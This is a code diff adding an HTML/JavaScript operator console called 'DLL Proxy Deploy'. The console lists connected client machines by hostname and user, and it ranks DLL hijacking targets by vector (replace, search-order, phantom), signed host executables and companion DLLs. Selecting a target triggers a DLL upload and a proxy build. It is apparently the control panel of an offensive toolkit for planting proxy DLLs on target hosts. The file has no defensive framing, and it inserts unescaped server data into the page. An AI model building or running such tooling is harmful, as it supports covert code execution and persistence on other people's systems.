@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DLL Proxy Deploy</title>
+<style>
+  :root { --bg: #0d1117; --surface: #161b22; --border: #30363d; --text: #c9d1d9;
+          --muted: #8b949e; --accent: #58a6ff; --green: #3fb950; --red: #f85149;
+          --yellow: #d29922; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Consolas', 'Monaco', monospace; background: var(--bg);
+         color: var(--text); font-size: 14px; }
+  .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
+  h1 { color: var(--accent); margin-bottom: 20px; font-size: 18px; }
+  h2 { color: var(--text); margin: 20px 0 10px; font-size: 15px; }
+
+  .panel { background: var(--surface); border: 1px solid var(--border);
+           border-radius: 6px; padding: 16px; margin-bottom: 16px; }
+
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th { text-align: left; padding: 8px 12px; color: var(--muted); border-bottom: 1px solid var(--border);
+       font-weight: normal; text-transform: uppercase; font-size: 11px; }
+  td { padding: 8px 12px; border-bottom: 1px solid var(--border); }
+  tr:hover { background: rgba(88,166,255,0.05); }
+  tr.selected { background: rgba(88,166,255,0.1); }
+
+  .tag { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: bold; }
+  .tag-signed { background: rgba(63,185,80,0.15); color: var(--green); }
+  .tag-unsigned { background: rgba(139,148,158,0.15); color: var(--muted); }
+  .tag-replace { background: rgba(210,153,34,0.15); color: var(--yellow); }
+  .tag-search { background: rgba(88,166,255,0.15); color: var(--accent); }
+  .tag-phantom { background: rgba(248,81,73,0.15); color: var(--red); }
+
+  .status { font-weight: bold; }
+  .status-waiting_upload { color: var(--yellow); }
+  .status-building { color: var(--accent); }
+  .status-ready { color: var(--green); }
+  .status-deployed { color: var(--green); }
+  .status-failed { color: var(--red); }
+
+  button { background: var(--accent); color: #fff; border: none; padding: 6px 16px;
+           border-radius: 4px; cursor: pointer; font-family: inherit; font-size: 12px; }
+  button:hover { opacity: 0.85; }
+  button:disabled { opacity: 0.4; cursor: not-allowed; }
+  button.small { padding: 3px 10px; font-size: 11px; }
+
+  .agent-row { cursor: pointer; }
+  .agent-row:hover { background: rgba(88,166,255,0.08); }
+
+  .meta { color: var(--muted); font-size: 12px; }
+  .topbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+  .back { color: var(--accent); cursor: pointer; font-size: 13px; }
+  .back:hover { text-decoration: underline; }
+
+  #toast { position: fixed; top: 20px; right: 20px; background: var(--surface);
+           border: 1px solid var(--green); color: var(--green); padding: 12px 20px;
+           border-radius: 6px; display: none; z-index: 100; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>// DLL Proxy Deploy</h1>
+  <div id="content"></div>
+</div>
+<div id="toast"></div>
+
+<script>
+const API = '';
+let currentClient = null;
+let refreshTimer = null;
+
+function toast(msg, ok=true) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.style.borderColor = ok ? 'var(--green)' : 'var(--red)';
+  t.style.color = ok ? 'var(--green)' : 'var(--red)';
+  t.style.display = 'block';
+  setTimeout(() => t.style.display = 'none', 3000);
+}
+
+function ago(ts) {
+  const s = Math.floor(Date.now()/1000 - ts);
+  if (s < 60) return s + 's ago';
+  if (s < 3600) return Math.floor(s/60) + 'm ago';
+  if (s < 86400) return Math.floor(s/3600) + 'h ago';
+  return Math.floor(s/86400) + 'd ago';
+}
+
+async function api(path, opts) {
+  const r = await fetch(API + path, opts);
+  if (!r.ok) throw new Error(await r.text());
+  return r.json();
+}
+
+// ── Agent List ──
+async function showClients() {
+  currentClient = null;
+  clearInterval(refreshTimer);
+  const data = await api('/api/clients');
+  const el = document.getElementById('content');
+
+  if (data.clients.length === 0) {
+    el.innerHTML = '<div class="panel"><p style="color:var(--muted)">No clients connected. Run the scanner on a target machine.</p></div>';
+    refreshTimer = setInterval(showClients, 5000);
+    return;
+  }
+
+  let html = '<div class="panel"><table><tr><th>Hostname</th><th>User</th><th>OS</th><th>Targets</th><th>Last Seen</th></tr>';
+  for (const a of data.clients) {
+    html += `<tr class="agent-row" onclick="showClient('${a.id}')">
+      <td>${a.hostname}</td><td>${a.username}</td><td class="meta">${a.os_info}</td>
+      <td>${a.target_count}</td><td class="meta">${ago(a.last_seen)}</td></tr>`;
+  }
+  html += '</table></div>';
+  el.innerHTML = html;
+  refreshTimer = setInterval(showClients, 5000);
+}
+
+// ── Agent Detail + Targets ──
+async function showClient(clientId) {
+  currentClient = clientId;
+  clearInterval(refreshTimer);
+  const data = await api(`/api/clients/${clientId}`);
+  const a = data.client;
+  const el = document.getElementById('content');
+
+  let html = `<div class="topbar"><span class="back" onclick="showClients()">&lt; all clients</span>
+    <span class="meta">${a.hostname} / ${a.username} / ${ago(a.last_seen)}</span></div>`;
+
+  // Builds
+  if (data.builds.length > 0) {
+    html += '<h2>Builds</h2><div class="panel"><table><tr><th>ID</th><th>Target</th><th>Status</th></tr>';
+    for (const b of data.builds) {
+      const target = data.targets.find(t => t.id === b.target_id);
+      const tname = target ? `${target.dll_name}` : `#${b.target_id}`;
+      html += `<tr><td class="meta">${b.id}</td><td>${tname}</td>
+        <td><span class="status status-${b.status}">${b.status}</span></td></tr>`;
+      if (b.error) html += `<tr><td colspan=3 class="meta" style="color:var(--red)">${b.error}</td></tr>`;
+    }
+    html += '</table></div>';
+  }
+
+  // Targets
+  html += '<h2>Targets</h2><div class="panel"><table>';
+  html += '<tr><th>#</th><th>Score</th><th>Vector</th><th>DLL</th><th>Arch</th><th>Signed</th><th>Comp</th><th>EXE</th><th></th></tr>';
+  for (const t of data.targets) {
+    const vecClass = {replace:'tag-replace', search_order:'tag-search', phantom:'tag-phantom'}[t.vector] || '';
+    const vecLabel = {replace:'RPL', search_order:'SRO', phantom:'PHT'}[t.vector] || t.vector;
+    const sigTag = t.exe_signed ? '<span class="tag tag-signed">S</span>' : '<span class="tag tag-unsigned">-</span>';
+    const hasActiveBuild = data.builds.some(b => b.target_id === t.id && !['failed'].includes(b.status));
+    const btnDisabled = hasActiveBuild ? 'disabled' : '';
+    const imp = t.import_type === 'delayed' ? 'D' : '';
+
+    html += `<tr>
+      <td class="meta">${t.id}</td>
+      <td><strong>${t.score}</strong></td>
+      <td><span class="tag ${vecClass}">${vecLabel}</span> ${imp}</td>
+      <td><strong>${t.dll_name}</strong></td>
+      <td>${t.arch}</td>
+      <td>${sigTag}</td>
+      <td>${t.companion_dlls.length}</td>
+      <td class="meta" style="max-width:400px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"
+          title="${t.exe_path}">${t.exe_path.split('\\').slice(-2).join('\\')}</td>
+      <td><button class="small" ${btnDisabled} onclick="selectTarget('${clientId}', ${t.id})">Select</button></td>
+    </tr>`;
+  }
+  html += '</table></div>';
+  el.innerHTML = html;
+  refreshTimer = setInterval(() => showClient(clientId), 4000);
+}
+
+async function selectTarget(clientId, targetId) {
+  try {
+    await api('/api/select', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({client_id: clientId, target_id: targetId}),
+    });
+    toast('Target selected - waiting for client to upload DLL');
+    showClient(clientId);
+  } catch(e) {
+    toast('Error: ' + e.message, false);
+  }
+}
+
+// Boot
+showClients();
+</script>
+</body>
+</html>
